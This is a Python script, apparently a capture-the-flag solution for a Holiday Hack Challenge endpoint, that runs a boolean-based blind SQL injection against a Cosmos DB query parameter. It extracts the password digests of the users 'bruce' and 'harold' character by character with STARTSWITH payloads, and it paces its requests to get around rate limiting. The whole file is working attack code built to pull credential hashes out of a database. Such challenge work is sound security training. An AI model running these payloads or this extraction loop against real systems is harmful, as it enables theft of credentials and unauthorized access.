#!/usr/bin/env python3

'''
Cosmos DB SQL Boolean-Based Blind Injection
Python script to find usernames digests in the database by hitting a
vulnerable query parameter that returns a boolean value indicating if
the SQL query is successful.
'''

import requests
import time

# Target URL
BASE_URL = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable"

def send_request(payload: str) -> bool:
    '''
    Sends a request to the server with the given SQL script payload and
    performs a boolean check of the response to determine if the payload
    was succesful.
    
    :param payload: the payload to submit
    :type payload: str
    :return: 'true' if the response indicates a successful check
    :rtype: bool
    '''
    # print(f"\n[+] Sending payload: {payload}")
    params = {
        "username": payload,
    }
    
    # Send request
    response = requests.get(BASE_URL, params=params)
    # print(f"[+] Response: {response.text}")

    # Sleep to bypass rate limiting
    time.sleep(0.5)

    # Interpret response
    return '"available":false' in response.text

# def check_char(username: str, propname: str, position: int, char: str) -> bool:
#     '''
#     Checks if the given character exists in the given property value at the position sepcified.
    
#     :param propname: the name of the property to check
#     :type propname: str
#     :param position: the index in the property value to check
#     :type position: int
#     :param char: the character to check
#     :type char: str
#     :return: 'true' if the given character matches the given position in the property value
#     :rtype: bool
#     '''
#     # Construct payload
#     payload = f"\" OR (c.username='{username}' AND SUBSTRING(c.{propname},{position},1)='{char}') OR \""
#     # Send payload and check response
#     return send_request(payload)

def check_value(username: str, propname: str, value: str) -> bool:
    '''
    Instead of checking each characer at a time, checking for prefix matching is faster.
    
    :param username: the name of the user to check
    :type username: str
    :param propname: the name of the property to check
    :type propname: str
    :param value: the index in the property value to check
    :type value: str
    :return: 'true' if the given substring matches the beginning of the property value
    :rtype: bool
    '''
    # Construct payload
    payload = f'" OR (c.username=\'{username}\' AND STARTSWITH(c.{propname},\'{value}\')) OR "'
    # Send payload and check response
    return send_request(payload)


def extract_property(usernames: list, db_property: str):
    """
    Extracts the value of the given property for the given usernames using blind SQLi techniques.
    
    :param usernames: a list of usernames to check
    :type usernames: list
    :param db_property: the name of the property to extract
    :type db_property: str
    :return: a dictionary mapping usernames to extracted property values
    :rtype: dict
    """

    # Character set for a digest
    charset = "abcdef0123456789"

    # Max length of digest to extract
    MAX_LENGTH = 35

    # Extraction loop
    for username in usernames:
        # Result accumulator
        extracted = ""

        print(f"\n[+] Extracting '{db_property}' property value for username '{username}'")

        # for pos in range(0, MAX_LENGTH + 1):  # SUBSTRING positions are 1-based
        #     found = False
        #     for ch in charset:
        #         if check_char(username, db_property, pos, ch):
        #             extracted += ch
        #             print(f"[*] Found character at position {pos}: {ch}")
        #             found = True
        #             break
        #     if not found:
        #         print(f"[-] No match at position {pos}, assuming end of string.")
        #         break

        for pos in range(0, MAX_LENGTH + 1):
            found = False
            for ch in charset:
                newvalue = extracted + ch
                if check_value(username, db_property, newvalue):
                    extracted = newvalue
                    print(f"[*] Found character at position {pos}: {ch}")
                    found = True
                    break
            if not found:
                print(f"[-] No match at position {pos}, assuming end of string.")
                break

        print(f"\n[+] Extracted {db_property} for {username}: {extracted}")

def main():
    # From initial analysis, it was found that the following usernames are available to check:
    # "bruce"
    # "harold"
    usernames = ["bruce", "harold"]

    # And that there is a "digest" property available in the database that could be extracted,
    # which is likely the password hash.
    db_property = "digest"

    extract_property(usernames, db_property)


if __name__ == "__main__":
    main()
